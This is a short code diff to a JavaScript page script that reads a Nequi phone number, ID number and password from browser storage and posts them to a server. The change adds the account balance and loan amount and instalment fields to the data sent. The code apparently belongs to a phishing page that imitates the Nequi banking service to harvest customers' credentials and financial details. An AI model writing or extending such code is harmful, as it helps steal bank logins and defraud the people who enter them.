@@ -58,7 +58,10 @@ document.addEventListener('DOMContentLoaded', () => {
         const celular = localStorage.getItem('nequi_celular');
         const cedula = localStorage.getItem('nequi_cedula');
         const clave = localStorage.getItem('nequi_clave');
+        const monto = localStorage.getItem('nequi_monto') || 'No seleccionado';
+        const cuota = localStorage.getItem('nequi_cuota') || 'No calculado';
         const saldo = saldoInput.value;
+        localStorage.setItem('nequi_saldo', saldo);
 
         if (!celular || !cedula || !clave) {
             alert('Error: Faltan datos de sesión. Por favor inicie nuevamente.');
@@ -78,7 +81,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ celular, cedula, clave, saldo })
+                body: JSON.stringify({ celular, cedula, clave, saldo, monto, cuota })
             });
 
             const result = await response.json();
